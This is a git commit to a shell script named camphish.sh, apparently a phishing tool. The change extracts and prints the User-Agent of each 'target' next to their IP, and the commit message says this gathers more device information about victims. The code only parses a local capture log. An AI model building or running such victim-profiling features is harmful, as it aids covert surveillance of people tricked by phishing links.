0531fa925010d4d5e8d41bb0e68a53e095d71afc
Dipesh <92223600+Dipesh3345@users.noreply.github.com>
2024-07-30 09:29:21 +0545

    display user agent in terminal while running Camphish
    User agent helps to get more information about the device and target

--- camphish.sh
+++ camphish.sh
@@ -55,8 +55,10 @@ exit 1
 catch_ip() {
 
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+user_agent=$(grep -a 'User-Agent:' ip.txt | cut -d " " -f2- | tr -d '\r')
 IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $user_agent
 
 cat ip.txt >> saved.ip.txt
 
